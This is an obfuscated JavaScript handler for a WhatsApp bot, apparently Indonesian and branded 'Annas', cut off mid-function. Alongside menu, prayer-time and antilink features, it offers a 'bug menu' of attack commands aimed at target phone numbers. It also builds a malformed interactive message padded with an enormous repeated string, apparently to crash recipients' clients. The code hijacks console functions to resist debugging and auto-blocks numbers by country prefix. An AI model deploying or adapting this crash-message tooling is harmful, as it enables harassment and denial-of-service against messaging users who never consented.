(function (_0x41d5e9, _0x28bb33) {
  const _0x4a2b3e = _0x41d5e9();
  while (true) {
    try {
      const _0xfa9fc7 = -parseInt(_0x27e6(776, -0x40)) / 1 + -parseInt(_0x27e6(1787, 0x4b3)) / 2 * (-parseInt(_0x27e6(1102, 0x206)) / 3) + -parseInt(_0x27e6(279, 0x2af)) / 4 * (parseInt(_0x27e6(935, 0x255)) / 5) + parseInt(_0x27e6(1749, 0x9e1)) / 6 + parseInt(_0x27e6(1049, 0x78)) / 7 + parseInt(_0x27e6(1165, 0x569)) / 8 + -parseInt(_0x27e6(816, 0x370)) / 9;
      if (_0xfa9fc7 === _0x28bb33) {
        break;
      } else {
        _0x4a2b3e.push(_0x4a2b3e.shift());
      }
    } catch (_0xbbbefe) {
      _0x4a2b3e.push(_0x4a2b3e.shift());
    }
  }
})(_0x433d, 566595);
const _0x1b1f44 = function () {
  let _0x126e83 = true;
  return function (_0x3da895, _0x536192) {
    const _0x59f154 = _0x126e83 ? function () {
      if (_0x536192) {
        const _0x301f01 = _0x536192.apply(_0x3da895, arguments);
        _0x536192 = null;
        return _0x301f01;
      }
    } : function () {};
    _0x126e83 = false;
    return _0x59f154;
  };
}();
const _0x1636e2 = _0x1b1f44(this, function () {
  return _0x1636e2.toString().search("(((.+)+)+)+$").toString().constructor(_0x1636e2).search("(((.+)+)+)+$");
});
_0x1636e2();
function _0x3219b3(_0x6e2f80, _0x5a63cc, _0x382c2b, _0x587851) {
  return _0x27e6(_0x587851 + 0xb2, _0x5a63cc);
}
const _0x3c625c = function () {
  let _0x20dc96 = true;
  return function (_0x1527b2, _0x48cfc2) {
    const _0x304c8d = _0x20dc96 ? function () {
      if (_0x48cfc2) {
        const _0x2df934 = _0x48cfc2.apply(_0x1527b2, arguments);
        _0x48cfc2 = null;
        return _0x2df934;
      }
    } : function () {};
    _0x20dc96 = false;
    return _0x304c8d;
  };
}();
const _0x4bd413 = _0x3c625c(this, function () {
  const _0x5d2062 = {
    zOSio: function (_0x22dbec, _0x1db0e3) {
      return _0x22dbec + _0x1db0e3;
    },
    ddxCq: "return (function() ",
    tKITh: function (_0x12b8f0, _0x4eae4c) {
      return _0x12b8f0 !== _0x4eae4c;
    },
    xyJVd: "zLDiX",
    hWRCI: "BVTKW",
    ieAfK: "log"
  };
  _0x5d2062.sVrbL = "warn";
  _0x5d2062.bnvlW = "info";
  _0x5d2062.xOGNG = "error";
  _0x5d2062.paPWH = "table";
  _0x5d2062.XbZSM = function (_0x29e407, _0x131065) {
    return _0x29e407 < _0x131065;
  };
  let _0x51654f;
  try {
    const _0xb7fd54 = Function("return (function() {}.constructor(\"return this\")( ));");
    _0x51654f = _0xb7fd54();
  } catch (_0xc84308) {
    _0x51654f = window;
  }
  const _0x59b1c2 = _0x51654f.console = _0x51654f.console || {};
  const _0x50a4b3 = ["log", _0x5d2062.sVrbL, _0x5d2062.bnvlW, _0x5d2062.xOGNG, "exception", _0x5d2062.paPWH, "trace"];
  for (let _0x3c29cd = 0; _0x5d2062.XbZSM(_0x3c29cd, _0x50a4b3.length); _0x3c29cd++) {
    const _0xd50954 = _0x3c625c.constructor.prototype.bind(_0x3c625c);
    const _0x55c12a = _0x50a4b3[_0x3c29cd];
    const _0x37d283 = _0x59b1c2[_0x55c12a] || _0xd50954;
    _0xd50954.__proto__ = _0x3c625c.bind(_0x3c625c);
    _0xd50954.toString = _0x37d283.toString.bind(_0x37d283);
    _0x59b1c2[_0x55c12a] = _0xd50954;
  }
});
function _0x11bc17(_0x5ce968, _0x35fd32, _0x1101e4, _0x1e73e2) {
  return _0x27e6(_0x35fd32 + 0x8b, _0x5ce968);
}
_0x4bd413();
module.exports = async (_0x799da7, _0x516d4a, _0x583a7e) => {
  try {
    const _0x23841e = _0x516d4a.key._0x500b53;
    const _0xae93d7 = _0x516d4a._0x1b9bca ? _0x516d4a._0x1b9bca : _0x516d4a;
    var _0x29b1d6 = _0x516d4a._0x270b3a === "interactiveResponseMessage" ? JSON.parse(_0x516d4a.message.interactiveResponseMessage._0x4bba67._0x3ef375).id : _0x516d4a._0x270b3a === "conversation" ? _0x516d4a.message.conversation : _0x516d4a._0x270b3a == "imageMessage" ? _0x516d4a.message.imageMessage.caption : _0x516d4a._0x270b3a == "videoMessage" ? _0x516d4a.message.videoMessage.caption : _0x516d4a._0x270b3a == "extendedTextMessage" ? _0x516d4a.message.extendedTextMessage.text : _0x516d4a._0x270b3a == "buttonsResponseMessage" ? _0x516d4a.message.buttonsResponseMessage._0x49e978 : _0x516d4a._0x270b3a == "listResponseMessage" ? _0x516d4a.message.listResponseMessage._0x1fe9e1._0x237acd : _0x516d4a._0x270b3a == "templateButtonReplyMessage" ? _0x516d4a.message.templateButtonReplyMessage._0x45f674 : _0x516d4a._0x270b3a == "messageContextInfo" ? _0x516d4a.message.buttonsResponseMessage?.["_0x49e978"] || _0x516d4a.message.listResponseMessage?.["_0x1fe9e1"]["_0x237acd"] || _0x516d4a.text : '';
    const _0x510a5e = typeof _0x516d4a.text == "string" ? _0x516d4a.text : '';
    const _0x5999dc = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(_0x29b1d6) ? _0x29b1d6.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
    const _0xc95fe3 = _0x29b1d6.startsWith(_0x5999dc);
    const _0x1a4aba = _0x29b1d6.replace(_0x5999dc, '').trim().split(/ +/).shift().toLowerCase();
    const _0x1671ca = _0x29b1d6.trim().split(/ +/).slice(1);
    const _0xc51d19 = (_0xae93d7._0x1c69dd || _0xae93d7)._0x2952b3 || '';
    const _0x288ff4 = q = _0x1671ca.join(" ");
    const _0x307159 = _0x23841e.endsWith("@g.us");
    const _0x27d327 = await _0x799da7._0xb59c48(_0x799da7._0x40fd71.id);
    const _0x1b5b85 = _0x516d4a.key._0x4d122e ? _0x799da7._0x40fd71.id.split(":")[0] + "@s.whatsapp.net" || _0x799da7._0x40fd71.id : _0x516d4a.key._0x5a61d7 || _0x516d4a.key._0x500b53;
    const _0x5d2088 = _0x1b5b85.split("@")[0];
    const _0x1d0560 = _0x516d4a._0x1160de || '' + _0x5d2088;
    const _0x5783f0 = _0x27d327.includes(_0x5d2088);
    const _0x12fd18 = _0x307159 ? await _0x799da7._0x19acda(_0x516d4a._0x19b14a)["catch"](_0x673414 => {}) : '';
    const _0x5800b1 = _0x307159 ? await _0x12fd18.participants : '';
    const _0x14b466 = _0x307159 ? await _0x5800b1.filter(_0x48f7a7 => _0x48f7a7._0x49ae3d !== null).map(_0x167edd => _0x167edd.id) : '';
    const _0x1eabd5 = _0x307159 ? _0x14b466.includes(_0x27d327) : false;
    const _0x19a7d6 = () => {
      var _0x2526c7 = fs._0x4fdcbb("./annas.js").toString();
      var _0x52815e = (_0x2526c7.match(/case '/g) || []).length;
      return _0x52815e;
    };
    const _0x8ccd36 = _0x307159 ? _0x14b466.includes(_0x1b5b85) : false;
    const _0x49dd55 = moment._0x5872b7("Asia/Jakarta").format("DD/MM/YY");
    const _0x28a242 = require('javascript-obfuscator');
    const {
      _0x19f9f1: _0x25940a,
      _0x33b78f: _0x4dd445,
      _0x4d8296: _0xd9ddb3
    } = require('./database/dtbs/deposit');
    const {
      _0x9154fd: _0x5cf846,
      _0x285af7: _0x27b432,
      _0x4372d5: _0x5311d1
    } = require('./database/lib/hdr.js');
    if (_0x516d4a.sender.startsWith("212")) {
      return _0x799da7._0x4ea230(_0x516d4a.sender, "block");
    }
    if (_0xc95fe3) {
      console.log(chalk.white._0x4c1195.bold("Ada Pesan, Om"), color("[〆 𝗔𝗻𝗻𝗮𝘀 〆 ]", "green"), color("FROM", "red"), color('' + _0x1d0560, "red"), color("Text :", "yellow"), color('' + _0x29b1d6, "blue"));
    }
    const _0x41fd95 = moment._0x5872b7("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const _0x1822d6 = moment._0x5872b7("Asia/Jakarta").format("HH : mm :ss");
    const _0xd2b295 = moment()._0x5872b7("Asia/Jakarta").format("HH:mm:ss");
    if (_0xd2b295 < "23:59:00") {
      var _0x51ab40 = "Selamat Malam 🏙️";
    }
    if (_0xd2b295 < "19:00:00") {
      var _0x51ab40 = "Selamat Petang 🌆";
    }
    if (_0xd2b295 < "18:00:00") {
      var _0x51ab40 = "Selamat Sore 🌇";
    }
    if (_0xd2b295 < "15:00:00") {
      var _0x51ab40 = "Selamat Siang 🌤️";
    }
    if (_0xd2b295 < "10:00:00") {
      var _0x51ab40 = "Selamat Pagi 🌄";
    }
    if (_0xd2b295 < "05:00:00") {
      var _0x51ab40 = "Selamat Subuh 🌆";
    }
    if (_0xd2b295 < "03:00:00") {
      var _0x51ab40 = "Selamat Tengah Malam 🌃";
    }
    _0x799da7._0x410e96 = _0x799da7._0x410e96 ? _0x799da7._0x410e96 : {};
    let _0x27f15d = _0x516d4a._0x19b14a;
    if (_0x27f15d in _0x799da7._0x410e96) {
      return false;
    }
    const _0x25b2c3 = {
      _0x27ea01: "04:29",
      _0x2595bd: "05:44",
      _0x213bdc: "06:02",
      _0x32cd5a: "12:02",
      _0x5effde: "15:15",
      _0x2b0aec: "17:52",
      _0x465e8e: "19:01"
    };
    const _0x17c483 = new Date(new Date().toLocaleString("en-US", {
      "_0x126390": "Asia/Jakarta"
    }));
    const _0x25c8f1 = _0x17c483.getHours();
    const _0x4aaac7 = _0x17c483.getMinutes();
    const _0x2fd6c7 = _0x25c8f1.toString().padStart(2, "0") + ":" + _0x4aaac7.toString().padStart(2, "0");
    for (let [_0x1a2ae9, _0x31c98c] of Object.entries(_0x25b2c3)) {
      if (_0x2fd6c7 === _0x31c98c) {
        const _0x117529 = {
          url: "https://media.vocaroo.com/mp3/1ofLT2YUJAjQ"
        };
        _0x799da7._0x410e96[_0x27f15d] = [_0x799da7._0x2e9b2a(_0x516d4a._0x19b14a, {
          "_0x5c2ae6": _0x117529,
          "_0x2952b3": "audio/mp4",
          "_0x5a4704": false,
          "_0x997701": {
            "_0x2d69a1": {
              "_0x2cdeaa": true,
              "_0x48df3b": 0x1,
              "_0x544cda": '',
              "title": "Selamat menunaikan Ibadah Sholat " + _0x1a2ae9,
              "body": "🕑 " + _0x31c98c,
              "_0x41fe27": '',
              "_0x11a07d": await fs._0x4fdcbb("./image/jadwal.jpg"),
              "_0x5e0007": true
            }
          }
        }, {}), setTimeout(async () => {
          delete client._0x410e96[_0x516d4a._0x19b14a];
        }, 57000)];
      }
    }
    const _0x1426bc = JSON.parse(fs._0x4fdcbb("./database/dtbs/premium.json"));
    const _0x17bc0f = JSON.parse(fs._0x4fdcbb("./database/dtbs/owner.json"));
    const _0x211fa5 = _0x1426bc.includes(_0x1b5b85);
    const _0x1ba836 = _0x17bc0f.includes(_0x5d2088) || _0x5783f0;
    _0x799da7._0x55253c = async (_0x1797cb, _0x50d0de, _0x521255, _0x3dbe76 = {}) => {
      const _0x34a2cf = {
        "url": _0x3dbe76 && _0x3dbe76._0x12059a ? _0x3dbe76._0x12059a : ''
      };
      const _0x82908b = {
        _0x12059a: _0x34a2cf
      };
      const _0x37c493 = {
        upload: _0x799da7._0x4d1b66
      };
      var _0x3da979 = await prepareWAMessageMedia(_0x82908b, _0x37c493);
      const _0x1c5ef4 = {
        text: _0x3dbe76 && _0x3dbe76.body ? _0x3dbe76.body : ''
      };
      const _0x53a23d = {
        "text": _0x3dbe76 && _0x3dbe76._0x524cb9 ? _0x3dbe76._0x524cb9 : ''
      };
      const _0xfc06d0 = {
        _0x163f12: true,
        videoMessage: _0x3da979.videoMessage
      };
      const _0x559da9 = {
        buttons: _0x50d0de,
        _0x117926: ''
      };
      const _0x4310dd = {
        title: global._0x309c73,
        body: "By 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼",
        _0x39631a: global._0x36b85f,
        _0x41fe27: global._0x69bdb5,
        _0x48df3b: 0x1,
        _0x5e0007: true
      };
      const _0x1af313 = {
        "_0x2d69a1": _0x4310dd
      };
      const _0x425147 = {
        body: _0x1c5ef4,
        _0x524cb9: _0x53a23d,
        _0x516bd0: _0xfc06d0,
        _0x597f49: _0x559da9,
        _0x997701: _0x1af313
      };
      const _0x4fedd1 = {
        "_0x39f8b4": _0x425147
      };
      const _0x279dbc = {
        "message": _0x4fedd1
      };
      const _0x39748c = {
        "_0x48cb7a": _0x279dbc
      };
      const _0x19f3ed = {
        "_0x1b9bca": _0x521255
      };
      let _0x379055 = generateWAMessageFromContent(_0x1797cb, _0x39748c, _0x19f3ed);
      await _0x799da7._0x197d1e("composing", _0x1797cb);
      return _0x799da7._0x35132e(_0x1797cb, _0x379055.message, {
        "_0x560a27": _0x379055.key.id
      });
    };
    async function _0x420f89(_0x4f3d74, _0x5ade58, _0x49e68e, _0x3a5931, _0x118bf9, _0x25e2b5, _0x30471a, _0x14b59c) {
      const _0xeb40fe = {
        _0x1f6c1d: _0x5ade58,
        parameters: _0x49e68e,
        _0x53900b: _0x3a5931,
        _0x374d2e: _0x118bf9
      };
      const _0x45433a = {
        _0xc2e93d: _0x25e2b5
      };
      _0x45433a._0xbb25b8 = _0x30471a;
      _0x45433a.filters = _0x14b59c;
      const _0x337299 = {
        filter: _0xeb40fe,
        _0x622fcb: _0x45433a
      };
      const _0xaad6f1 = {
        _0x3b2b5d: _0x337299
      };
      var _0xa7244e = generateWAMessageFromContent(_0x4f3d74, proto._0x8fefb1._0x4e00f4(_0xaad6f1), {
        "_0x5f5834": _0x4f3d74
      });
      await _0x799da7._0x35132e(_0x4f3d74, _0xa7244e.message, {
        "_0x5a61d7": {
          "_0x4c2aae": _0x4f3d74
        },
        "_0x560a27": _0xa7244e.key.id
      });
    }
    async function _0x2fe929(_0x500b37, _0x4c7cea, _0x5891da, _0x472542, _0x572e0b, _0x29d216, _0x1b352c, _0x34fb5e, _0x361a79, _0x44b391, _0x112114, _0x515996, _0x50c568, _0x1819bf) {
      const _0x17151c = {
        _0x22464a: _0x4c7cea,
        _0x38cba0: _0x5891da,
        _0x11aac4: _0x472542,
        _0x88760e: _0x572e0b,
        _0x174d8e: _0x29d216,
        _0x1da387: _0x1b352c,
        _0x3f6167: _0x34fb5e,
        _0xb7eeeb: _0x361a79,
        _0x1c1d4e: _0x44b391,
        _0x3ce119: _0x112114,
        _0x530dd5: _0x515996,
        _0xb3878c: _0x50c568,
        _0x1ccb2b: _0x1819bf
      };
      const _0xb22e54 = {
        _0x2cb262: _0x17151c
      };
      var _0x4a885e = generateWAMessageFromContent(_0x500b37, proto._0x8fefb1._0x4e00f4(_0xb22e54), {
        "_0x5f5834": _0x500b37
      });
      await _0x799da7._0x35132e(_0x500b37, _0x4a885e.message, {
        "_0x5a61d7": {
          "_0x4c2aae": _0x500b37
        },
        "_0x560a27": _0x4a885e.key.id
      });
    }
    const _0x453ad9 = {
      _0x500b53: "p",
      _0x4d122e: false,
      _0x5a61d7: "0@s.whatsapp.net"
    };
    const _0x343db4 = {
      text: "Sent",
      format: "DEFAULT"
    };
    const _0x2a6fa3 = {
      "key": _0x453ad9,
      "message": {
        "interactiveResponseMessage": {
          "body": _0x343db4,
          "_0x4bba67": {
            "name": "galaxy_message",
            "_0x3ef375": "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            "version": 0x3
          }
        }
      }
    };
    let _0x3d22c6 = [];
    for (let _0x11e58a of _0x17bc0f) {
      _0x3d22c6.push({
        "displayName": await _0x799da7._0x50c3c7(_0x11e58a + "@s.whatsapp.net"),
        "_0x51bae4": "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await _0x799da7._0x50c3c7(_0x11e58a + "@s.whatsapp.net")) + "\n\nFN:" + (await _0x799da7._0x50c3c7(_0x11e58a + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + _0x11e58a + ":" + _0x11e58a + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6144\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    try {
      ppuser = await _0x799da7._0x23d750(_0x516d4a.sender, "image");
    } catch (_0x4dff92) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    async function _0x3d334f(_0x153d4f) {
      return new Promise((_0x273ab2, _0x1d443a) => {
        try {
          const _0x596a2d = {
            compact: false,
            _0x308dbe: true,
            _0x1810db: 0x1,
            _0x19c865: true,
            _0x3cf540: true,
            _0x2171cd: true,
            _0x408888: true,
            _0x5459a3: 0x1
          };
          const _0xf2cbab = _0x28a242.obfuscate(_0x153d4f, _0x596a2d);
          const _0x39cca6 = {
            "status": 0xc8,
            "_0x7bab3f": "A𝙣𝙣𝙖𝙨",
            "result": _0xf2cbab._0x3281ec()
          };
          _0x273ab2(_0x39cca6);
        } catch (_0xa212db) {
          _0x1d443a(_0xa212db);
        }
      });
    }
    if (!_0x799da7["public"]) {
      if (!_0x516d4a.key._0x4d122e) {
        return;
      }
    }
    async function _0x1fdfac() {
      var _0x45cf75 = ["𝟭", "𝟮", "𝟯", "〆 𝗔𝗻𝗻𝗮𝘀 〆 "];
      const _0x2a57e6 = {
        "text": "〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼"
      };
      let {
        key: _0xe21338
      } = await _0x799da7._0x2e9b2a(_0x23841e, _0x2a57e6);
      for (let _0xed8551 = 0; _0xed8551 < _0x45cf75.length; _0xed8551++) {
        const _0x14fed4 = {
          text: _0x45cf75[_0xed8551],
          _0x352d03: _0xe21338
        };
        await _0x799da7._0x2e9b2a(_0x23841e, _0x14fed4);
      }
    }
    const _0x105e8a = _0x2b69cb => {
      _0x799da7._0x2e9b2a(_0x516d4a._0x19b14a, {
        "text": _0x2b69cb,
        "_0x997701": {
          "_0xe6f9af": [_0x1b5b85],
          "_0x3d0c3e": 0x98967f,
          "_0x4baafc": true,
          "_0x2d69a1": {
            "_0x2cdeaa": true,
            "_0x1c8b28": true,
            "title": "〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
            "body": '' + namabot,
            "_0x52b086": "PHOTO",
            "_0x39631a": '',
            "_0x11a07d": fs._0x4fdcbb("./dah.jpg"),
            "_0x41fe27": '' + isLink
          }
        }
      }, {
        "_0x1b9bca": _0x516d4a
      });
    };
    const _0x273f35 = {
      _0x500b53: "status@broadcast"
    };
    const _0x59845b = {
      "_0x4d122e": false,
      "_0x5a61d7": "0@s.whatsapp.net",
      ...(_0x23841e ? _0x273f35 : {})
    };
    const _0x42b838 = {
      "url": "https://j.top4top.io/m_3201f7cps0.mp4"
    };
    const _0x32f4fe = {
      "key": _0x59845b,
      "message": {
        "_0x3c1ac6": {
          "displayName": '' + _0x1d0560,
          "_0x51bae4": "BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:" + _0x1d0560 + ",\nitem1.TEL;waid=" + _0x1b5b85.split("@")[0] + ":" + _0x1b5b85.split("@")[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
          "_0x4552d0": _0x42b838
        }
      }
    };
    if (_0x516d4a._0x5bf2d2 && !_0x516d4a.key._0x4d122e && !_0x1ba836 && antilink) {
      if (!_0x1eabd5) {
        return;
      }
      if (_0x510a5e.match("whatsapp.com")) {
        const _0xc4c5d = {
          text: "*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group " + _0x12fd18.subject
        };
        _0x799da7._0x2e9b2a(_0x516d4a._0x19b14a, _0xc4c5d, {
          "_0x1b9bca": _0x516d4a
        });
        _0x799da7._0x50b234(_0x516d4a._0x19b14a, [_0x1b5b85], "delete");
        _0x799da7._0x2e9b2a(_0x516d4a._0x19b14a, {
          "delete": _0x516d4a.key
        });
      }
    }
    switch (_0x1a4aba) {
      case "menu":
        {
          await _0x1fdfac();
          darkphonk = fs._0x4fdcbb("./image/yali.mp3");
          const _0x3f267a = "\n┏─ ｢ `〆 𝗔𝗻𝗻𝗮𝘀 〆 ` ｣ ─❐\n║〆 𝐍𝐚𝐦𝐞 :" + _0x1d0560 + "\n│〆 𝙊𝙬𝙣𝙚𝙧 : " + author + "\n║〆 𝙉𝙖𝙢𝙖 𝘽𝙤𝙩 : " + namabot + "\n│〆 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : " + namaCreator + "\n║〆 𝙊𝙬𝙣 𝙉𝙤 : 6285768351775\n╰▬▭「 〆 𝗔𝗻𝗻𝗮𝘀 〆  」▭▬\n\n    `𝙔𝙏 𝘼𝙉𝙉𝘼𝙎𝙄𝙉𝘾𝙐𝙎 `";
          const _0x6bfb84 = {
            title: " 𝙍𝙐𝙇𝙀𝙎 ",
            id: ".perintah"
          };
          const _0x2cd58b = {
            title: "𝙱𝚄𝚃𝚃𝙾𝙽 𝙻𝙸𝚂𝚃",
            _0x6cb12: "Annas List",
            rows: [_0x6bfb84]
          };
          const _0x2eb26f = {
            _0x6cb12: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            rows: [{
              "title": " 𝘼𝙩𝙩𝙖𝙘𝙠  ",
              "id": ".bugmenu"
            }]
          };
          const _0x1fc660 = {
            _0x6cb12: "𝘽𝙐𝘼𝙏 𝙋𝘼𝙉𝙀𝙇",
            rows: [{
              "title": " 𝙇𝙄𝙎𝙏 𝙋𝘼𝙉𝙀𝙇 ",
              "id": ".menupanel"
            }]
          };
          let _0x4d2f46 = [_0x2cd58b, _0x2eb26f, _0x1fc660];
          const _0x4ba1a9 = {
            title: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
            _0x3cb1e3: _0x4d2f46
          };
          const _0x27baed = {
            _0x110705: {},
            _0xe95360: 0x2
          };
          const _0xcd036b = {
            "_0x2cdeaa": true
          };
          const _0x577752 = {
            "text": _0x3f267a
          };
          const _0x2ab1af = {
            text: ''
          };
          const _0x3f9e07 = {
            upload: _0x799da7._0x4d1b66
          };
          let _0x3c4e80 = generateWAMessageFromContent(_0x516d4a._0x19b14a, {
            "_0x48cb7a": {
              "message": {
                "messageContextInfo": _0x27baed,
                "_0x39f8b4": proto._0x8fefb1._0x1525c2.create({
                  "_0x997701": {
                    "_0xe6f9af": [_0x516d4a.sender],
                    "_0x2d69a1": _0xcd036b
                  },
                  "body": proto._0x8fefb1._0x1525c2._0xa68fe5.create(_0x577752),
                  "_0x524cb9": proto._0x8fefb1._0x1525c2._0x3f7d35.create(_0x2ab1af),
                  "_0x516bd0": proto._0x8fefb1._0x1525c2._0x10b529.create({
                    "_0x163f12": true,
                    ...(await prepareWAMessageMedia({
                      "image": await fs._0x4fdcbb("./dah.jpg")
                    }, _0x3f9e07))
                  }),
                  "_0x597f49": proto._0x8fefb1._0x1525c2._0x5d2380.create({
                    "buttons": [{
                      "name": "single_select",
                      "_0x14eb59": JSON.stringify(_0x4ba1a9)
                    }, {
                      "name": "cta_url",
                      "_0x14eb59": "{\"display_text\":\"𝙈𝙮 𝙔𝙤𝙪𝙩𝙪𝙗𝙚\",\"url\":\"https://youtube.com/@AnnasIncus\",\"merchant_url\":\"https://youtube.com/@AnnasIncus\"}"
                    }]
                  })
                })
              }
            }
          }, {
            "_0x5f5834": _0x516d4a.sender,
            "_0x1b9bca": _0x516d4a
          });
          await _0x799da7._0x35132e(_0x3c4e80.key._0x500b53, _0x3c4e80.message, {
            "_0x560a27": _0x3c4e80.key.id
          });
          const _0x1cfbe2 = {
            _0x5c2ae6: darkphonk,
            _0x2952b3: "audio/mp4",
            _0x5a4704: true
          };
          await _0x799da7._0x2e9b2a(_0x516d4a._0x19b14a, _0x1cfbe2, {
            "_0x1b9bca": _0x516d4a
          });
        }
        break;
      case "bugmenu":
        {
          await _0x1fdfac();
          const _0x650de6 = "\n┏─ ｢ `〆 𝗔𝗻𝗻𝗮𝘀 〆  ` ｣ ─❐\n│〆 𝐍𝐚𝐦𝐞 :" + _0x1d0560 + "\n║▬▭「 𝙎𝙐𝙈𝘽𝙀𝙍 」▭▬\n│〆 𝙊𝙬𝙣𝙚𝙧 : " + author + "\n║〆 𝙉𝙖𝙢𝙖 𝘽𝙤𝙩 : " + namabot + "\n│〆 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : " + namaCreator + "\n║〆 𝙊𝙬𝙣 𝙉𝙤 : 6285768351775\n╰▬▭「 〆 𝗔𝗻𝗻𝗮𝘀 〆  」▭▬\n╔─═⊱ *「 `BUG MENU` 」* ─═⬣\n│┏⊱\n║〆 kontol 628𝙭𝙭𝙭\n║〆 yatim 628𝙭𝙭𝙭\n║〆 🤬 628𝙭𝙭𝙭\n║┗⊱\n┗━━━━━━━━━━━━━━━━━⬣\n\n┏━━⬣  Thanks To  友\n┃ 🔥 𝘼𝙣𝙣𝙖𝙨𝙄𝙣𝙘𝙪𝙨\n┃ 🔥 𝙊𝙧𝙖𝙣𝙜 𝙩𝙪𝙖\n┃ 🔥 𝙥𝙖𝙧𝙖𝙝 𝙥𝙚𝙣𝙙𝙪𝙠𝙪𝙣𝙜 \n┗━━⬣ 〆 𝗔𝗻𝗻𝗮𝘀 〆 ˼  ";
          const _0x12ea4f = {
            title: "𝙱𝚄𝚃𝚃𝙾𝙽 𝙻𝙸𝚂𝚃",
            _0x6cb12: "𝙍𝙐𝙇𝙀𝙎",
            rows: [{
              "title": " 𝙍𝙐𝙇𝙀𝙎 ",
              "id": ".perintah"
            }]
          };
          const _0x2f0517 = {
            _0x6cb12: "Bug Menu",
            rows: [{
              "title": " List Bug",
              "id": ".bugmenu"
            }]
          };
          let _0x198ed9 = [_0x12ea4f, _0x2f0517];
          const _0x368542 = {
            title: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
            _0x3cb1e3: _0x198ed9
          };
          const _0x535a60 = {
            _0x110705: {},
            _0xe95360: 0x2
          };
          const _0x2f7bee = {
            _0x2cdeaa: true
          };
          const _0x33642a = {
            "text": _0x650de6
          };
          const _0xc860af = {
            text: ''
          };
          const _0x4bc11a = {
            upload: _0x799da7._0x4d1b66
          };
          let _0x4349b0 = generateWAMessageFromContent(_0x516d4a._0x19b14a, {
            "_0x48cb7a": {
              "message": {
                "messageContextInfo": _0x535a60,
                "_0x39f8b4": proto._0x8fefb1._0x1525c2.create({
                  "_0x997701": {
                    "_0xe6f9af": [_0x516d4a.sender],
                    "_0x2d69a1": _0x2f7bee
                  },
                  "body": proto._0x8fefb1._0x1525c2._0xa68fe5.create(_0x33642a),
                  "_0x524cb9": proto._0x8fefb1._0x1525c2._0x3f7d35.create(_0xc860af),
                  "_0x516bd0": proto._0x8fefb1._0x1525c2._0x10b529.create({
                    "_0x163f12": true,
                    ...(await prepareWAMessageMedia({
                      "image": await fs._0x4fdcbb("./dah.jpg")
                    }, _0x4bc11a))
                  }),
                  "_0x597f49": proto._0x8fefb1._0x1525c2._0x5d2380.create({
                    "buttons": [{
                      "name": "single_select",
                      "_0x14eb59": JSON.stringify(_0x368542)
                    }, {
                      "name": "cta_url",
                      "_0x14eb59": "{\"display_text\":\"𝙈𝙮 𝙔𝙤𝙪𝙩𝙪𝙗𝙚\",\"url\":\"https://youtube.com/@AnnasIncus\",\"merchant_url\":\"https://youtube.com/@AnnasIncus\"}"
                    }]
                  })
                })
              }
            }
          }, {
            "_0x5f5834": _0x516d4a.sender,
            "_0x1b9bca": _0x516d4a
          });
          await _0x799da7._0x35132e(_0x4349b0.key._0x500b53, _0x4349b0.message, {
            "_0x560a27": _0x4349b0.key.id
          });
        }
        break;
      case "menupanel":
        {
          await _0x1fdfac();
          const _0x2ff884 = {
            title: "𝙱𝚄𝚃𝚃𝙾𝙽 𝙻𝙸𝚂𝚃",
            _0x6cb12: "𝙍𝙐𝙇𝙀𝙎",
            rows: [{
              "title": " 𝙍𝙐𝙇𝙀𝙎 ",
              "id": ".perintah"
            }]
          };
          const _0x7a10c2 = {
            _0x6cb12: "𝘽𝙐𝙏𝙏𝙊𝙉 𝘽𝙐𝙂 1",
            rows: [{
              "title": " 𝗟𝗜𝗦𝗧 𝗕𝗨𝗧𝗧𝗢𝗡 𝗕𝗨𝗚 ",
              "id": ".kontol"
            }]
          };
          const _0x1b58e7 = {
            _0x6cb12: "𝘽𝙐𝙏𝙏𝙊𝙉 𝘽𝙐𝙂 2",
            rows: [{
              "title": " 𝗟𝗜𝗦𝗧 𝗕𝗨𝗧𝗧𝗢𝗡 𝗕𝗨𝗚 ",
              "id": ".yatim"
            }]
          };
          let _0x2209d4 = [_0x2ff884, _0x7a10c2, _0x1b58e7];
          const _0x4304fc = {
            title: "〆 𝗔𝗻𝗻𝗮𝘀 〆 ",
            _0x3cb1e3: _0x2209d4
          };
          const _0x3edeb2 = {
            _0x110705: {},
            _0xe95360: 0x2
          };
          const _0x1f46bc = {
            _0x2cdeaa: true
          };
          const _0x2b7039 = {
            text: bugmenu
          };
          const _0x49ea54 = {
            "text": ''
          };
          const _0x49aafa = {
            upload: _0x799da7._0x4d1b66
          };
